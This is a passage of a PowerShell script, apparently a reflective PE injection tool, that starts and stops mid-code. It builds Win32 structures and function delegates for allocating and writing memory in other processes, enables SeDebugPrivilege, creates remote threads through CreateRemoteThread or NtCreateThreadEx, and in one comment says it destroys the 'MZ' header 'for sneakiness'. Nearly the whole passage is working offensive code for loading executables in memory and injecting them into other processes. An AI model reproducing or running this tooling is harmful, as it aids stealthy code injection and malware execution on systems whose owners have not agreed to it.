        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES

        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object

        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object

        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy

        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset

        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr

        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject

        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory

        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory

        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread

        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread

        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken

        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread

        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges

        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue

        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf

        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }

        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process

        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread

        return $Win32Functions
    }
    #####################################


    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }

                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF

                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }

        return $false
    }


    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )

        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }

    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )

        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))

        $PEEndAddress = $PEInfo.EndAddress

        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }

    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,

            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )

        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }

        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw "Unable to impersonate self"
                }

                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }

        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
        if ($Result -eq $false)
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }

    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,

        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )

        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero

        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }

        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }

        return $RemoteThreadHandle
    }

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        $NtHeadersInfo = New-Object System.Object

        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)

        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }

